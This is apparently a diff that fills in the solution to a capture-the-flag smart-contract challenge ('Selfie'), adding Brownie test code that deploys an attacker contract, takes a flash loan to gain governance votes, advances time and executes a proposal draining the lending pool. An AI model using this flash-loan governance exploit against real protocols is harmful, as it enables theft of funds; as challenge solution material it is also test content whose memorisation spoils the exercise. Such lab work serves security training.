@@ -48,5 +48,27 @@ def test_solve_challenge():
     ##### SOLUTION GOES HERE #####
     ##############################
     
+    # import attacker contract and web3
+    from brownie import SelfieAttack
+    web3 = import_web3()
+
+    # deploy the attacker contract
+    attacker_contract = SelfieAttack.deploy(token.address, pool.address, governance.address, _fromAttacker)  
+
+    # encode the function call that drains all funds from the pool and save it as a state variable in the selfie contract
+    drain_tx = pool.drainAllFunds.encode_input(attacker.address)  
+
+    # set the drain tx data in the attacker contract
+    attacker_contract.setAttackData(drain_tx, _fromAttacker)
+
+    # take flash loan
+    attacker_contract.takeLoan(_fromAttacker)
+
+    # wait 2 days to execute the malicious proposal
+    web3.provider.make_request('evm_increaseTime', [2*24*60*60])
+     
+    # execute the malicious proposal
+    governance.executeAction(attacker_contract.maliciousAction(), _fromAttacker)
+    
     ######################
     check_solution()
